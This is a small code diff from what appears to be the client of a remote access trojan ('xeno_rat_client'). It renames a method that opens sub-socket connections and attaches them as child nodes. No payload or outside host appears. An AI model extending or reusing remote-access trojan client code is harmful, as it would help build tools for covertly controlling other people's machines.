@@ -24,7 +24,7 @@ namespace xeno_rat_client
             {
                 int type = data[1];
                 int retid = data[2];
-                Node sub = await Main.ConnectSubSockAsync(type, retid, HandleServiceStop);
+                Node sub = await Main.InitializeConnectionAsync(type, retid, HandleServiceStop);
                 sub.Parent = Main;
                 Main.AddSubNode(sub);
                 if (sub.connectionType == 1)
